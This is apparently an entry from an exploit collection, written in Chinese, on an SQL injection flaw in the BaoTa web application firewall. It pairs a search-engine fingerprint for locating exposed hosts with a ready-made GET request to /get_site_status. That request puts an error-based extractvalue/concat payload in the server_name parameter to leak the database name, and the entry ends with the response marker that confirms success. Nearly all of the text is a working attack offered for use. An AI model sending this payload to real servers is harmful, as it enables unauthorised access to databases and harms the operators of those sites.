# 宝塔WAFSQL注入漏洞

宝塔WAF ｜ SQL注入 ｜ —
- **指纹**：`title=="404 - Website not exist!"`
- **请求**：`GET /get_site_status?server_name='-extractvalue(1,concat(0x5c,database()))-' HTTP/2`
- **响应特征**：200 syntax